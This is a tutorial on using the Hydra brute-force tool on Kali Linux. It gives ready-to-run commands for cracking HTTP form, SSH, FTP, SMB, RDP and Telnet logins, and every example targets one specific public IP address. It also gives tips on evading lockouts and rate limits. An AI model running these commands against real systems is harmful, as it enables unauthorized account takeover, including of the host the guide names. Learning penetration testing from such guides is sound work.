# Hydra Guide

Hydra is a powerful password-cracking tool used for brute-forcing authentication on various protocols and services. This guide provides a structured overview of using Hydra on Kali Linux, including common commands, attack types, and best practices for ethical penetration testing.

## Overview

Hydra is designed to perform brute-force attacks against services like HTTP, SSH, FTP, and more, by attempting username and password combinations. It supports multiple protocols and is highly configurable for targeted attacks.

## Prerequisites

- **Permissions**: Ensure you have explicit authorization to test the target system or service.
- **Installation**: Hydra is pre-installed on Kali Linux. Verify with `hydra -V`.
- **Wordlists**: Use quality wordlists (e.g., `/usr/share/wordlists/rockyou.txt`) for passwords and usernames.
- **Target**: Identify the target IP, port, and service (e.g., `157.180.117.237:8081` running HTTP).

## Basic Hydra Command

```bash
hydra -l <username> -P <password-wordlist> <target-ip> <service>
```

- `-l <username>`: Specifies a single username to test.
- `-P <password-wordlist>`: Specifies a password wordlist (e.g., `/usr/share/wordlists/rockyou.txt`).
- `<target-ip>`: The target IP address or hostname.
- `<service>`: The service to attack (e.g., `http-get`, `ssh`, `ftp`).

**Example**:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 157.180.117.237 http-get / -s 8081
```

- Attempts to brute-force the `admin` account on `157.180.117.237:8081` using HTTP GET requests to `/`.

## Common Hydra Attack Types

Hydra supports various protocols and attack methods. Below are examples for commonly targeted services.

### HTTP GET/POST Brute-Force

- **HTTP GET**:

  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8081 157.180.117.237 http-get /
  ```

  - `-s 8081`: Specifies the port (default is 80 for HTTP).
  - `http-get /`: Targets the root path (`/`) with GET requests.

- **HTTP POST** (Form Login):

  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt 157.180.117.237 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
  ```

  - `http-post-form`: Targets a login form.
  - `/login`: Path to the login form.
  - `username=^USER^&password=^PASS^`: Form parameters with `^USER^` and `^PASS^` as placeholders.
  - `F=Invalid`: Failure message indicating an incorrect login attempt.

### SSH Brute-Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 157.180.117.237 ssh
```

- `ssh`: Targets SSH service (default port 22).
- Attempts to brute-force the `root` account using the specified password list.

### FTP Brute-Force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 157.180.117.237 ftp
```

- `ftp`: Targets FTP service (default port 21).
- Brute-forces the `user` account with passwords from the wordlist.

### SMB Brute-Force

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 157.180.117.237 smb
```

- `smb`: Targets SMB service (default ports 139/445).
- Attempts to brute-force the `administrator` account.

### RDP Brute-Force

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 157.180.117.237 rdp
```

- `rdp`: Targets Remote Desktop Protocol (default port 3389).
- Brute-forces the `administrator` account.

### Telnet Brute-Force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 157.180.117.237 telnet
```

- `telnet`: Targets Telnet service (default port 23).
- Attempts to brute-force the `user` account.

## Useful Hydra Options

- **Username Options**:
  - `-l <username>`: Single username (e.g., `-l admin`).
  - `-L <username-wordlist>`: List of usernames (e.g., `-L users.txt`).
  - `-u`: Loop through usernames first (default is passwords first).
- **Password Options**:
  - `-P <password-wordlist>`: Password wordlist (e.g., `-P /usr/share/wordlists/rockyou.txt`).
  - `-p <password>`: Single password (e.g., `-p password123`).
- **Performance**:
  - `-t <tasks>`: Number of parallel tasks (default: 16; e.g., `-t 32` for faster attacks).
  - `-w <seconds>`: Wait time between attempts (e.g., `-w 5` to avoid lockouts).
- **Output**:
  - `-o <file>`: Save results to a file (e.g., `-o results.txt`).
  - `-f`: Stop after finding the first valid credential pair.
  - `-vV`: Verbose output for debugging.
- **Service-Specific**:
  - `-s <port>`: Specify a non-standard port (e.g., `-s 8081`).
  - `-S`: Use SSL/TLS for the connection (e.g., for HTTPS).
  - `-M <file>`: Target multiple hosts from a file (e.g., `-M targets.txt`).
- **Proxy Support**:
  - `--proxy <ip:port>`: Route traffic through a proxy (e.g., `--proxy 127.0.0.1:8080`).

**Example with Advanced Options**:

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 16 -o results.txt -vV 157.180.117.237 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -s 8081
```

- Uses a username list, limits to 16 tasks, saves output, and targets a login form on port 8081.

## Hydra Workflow

Follow this step-by-step process for effective brute-forcing:

1. **Identify Target Service**:

   - Use tools like Nmap to identify open ports and services (e.g., `nmap -sV 157.180.117.237`).
   - Note the service (e.g., HTTP, SSH) and port (e.g., 8081).

2. **Prepare Wordlists**:

   - Select or create username and password wordlists (e.g., `/usr/share/wordlists/rockyou.txt`).
   - For forms, inspect the login page (e.g., via Burp Suite) to identify form parameters and failure messages.

3. **Test with Single Username**:

   ```bash
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 157.180.117.237 http-get / -s 8081
   ```

   - Start with a known or common username (e.g., `admin`).

4. **Expand to Username List**:

   ```bash
   hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 157.180.117.237 http-get / -s 8081
   ```

   - Use a username wordlist for broader coverage.

5. **Refine Attack**:

   - Adjust `-t` and `-w` to balance speed and avoid account lockouts.
   - Use `-f` to stop after finding valid credentials.

**Example Workflow**:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 157.180.117.237 ssh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 157.180.117.237 ftp
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 8 -o results.txt 157.180.117.237 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" -s 8081
```

## Best Practices

1. **Start Small**: Use small wordlists and single usernames to test the target without triggering lockouts.
2. **Monitor Lockouts**: Check for account lockout policies and use `-w` to add delays if needed.
3. **Save Results**: Always use `-o` to save successful credentials for reporting.
4. **Stay Legal**: Only perform brute-forcing on systems with explicit permission.
5. **Combine Tools**: Use Hydra alongside Nmap, Burp Suite, or Metasploit for comprehensive testing.
6. **Optimize Wordlists**: Tailor wordlists to the target (e.g., using `cewl` to scrape site-specific terms).

## Common Issues and Solutions

- **Account Lockouts**: Reduce `-t` or add `-w` to slow down attempts; verify lockout policies with the system owner.
- **Connection Errors**: Ensure the target IP, port, and service are correct; use `-vV` for debugging.
- **Form Attacks Fail**: Verify form parameters and failure messages using a web proxy (e.g., Burp Suite).
- **Rate Limiting**: Use `--proxy` or `-w` to bypass restrictions or slow down requests.

## Additional Notes

- **Wordlists**: Explore `/usr/share/wordlists/` for additional lists (e.g., SecLists, dirb wordlists).
- **Custom Attacks**: Use Hydra’s `-e` option to test empty passwords (`-e n`), same as username (`-e s`), or reverse username (`-e r`).
  - Example: `hydra -l admin -P passwords.txt -e ns 157.180.117.237 ssh`.
- **Documentation**: Run `hydra -h` or consult the official THC-Hydra documentation for advanced options.